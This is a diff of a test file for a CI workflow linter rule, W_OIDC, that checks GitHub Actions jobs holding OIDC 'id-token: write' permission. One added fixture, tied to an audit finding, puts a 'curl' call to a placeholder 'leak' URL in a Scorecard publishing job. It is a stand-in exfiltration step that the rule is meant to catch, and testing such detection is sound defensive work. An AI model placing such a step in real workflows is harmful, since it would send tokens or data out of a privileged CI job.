@@ -233,6 +233,10 @@ test('W_OIDC rejects a job named scan holding id-token: write with a run: npm in
   const text=wf(job('      - run: npm install\n','scan','    permissions:\n      id-token: write\n'));
   assert.ok((await run('W_OIDC',text)).length>0);
 });
+test('W_OIDC rejects a Scorecard publishing job that also runs a shell step (audit finding, 2026-10-27)',async()=>{
+  const text=wf(job(`      - uses: ossf/scorecard-action@${sha('a')} # v2.5.0\n        with:\n          publish_results: true\n      - run: curl -sSf https://example.invalid/leak\n`,'scan','    permissions:\n      id-token: write\n'));
+  assert.equal((await run('W_OIDC',text)).length,1);
+});
 test('W_OIDC rejects ossf/scorecard-action with publish_results: false',async()=>{
   const text=wf(job(`      - uses: ossf/scorecard-action@${sha('a')} # v2.5.0\n        with:\n          publish_results: false\n`,'scan','    permissions:\n      id-token: write\n'));
   assert.equal((await run('W_OIDC',text)).length,1);
@@ -252,7 +256,7 @@ test('W_OIDC checks Scorecard action identity, every uses step and explicit publ
     assert.equal((await run('W_OIDC',JSON.stringify(data))).length,1,String(value));
   }
   const data=structuredClone(valid);data.jobs.scan.steps.push({run:'npm install'});
-  assert.equal((await run('W_OIDC',JSON.stringify(data))).length,1);
+  assert.ok((await run('W_OIDC',JSON.stringify(data))).length>=1,'a run step disqualifies the Scorecard exemption and the install is flagged');
   assert.equal((await run('W_OIDC',text.replace('permissions: read-all','permissions:\n  id-token: write'))).length,1);
 });
 
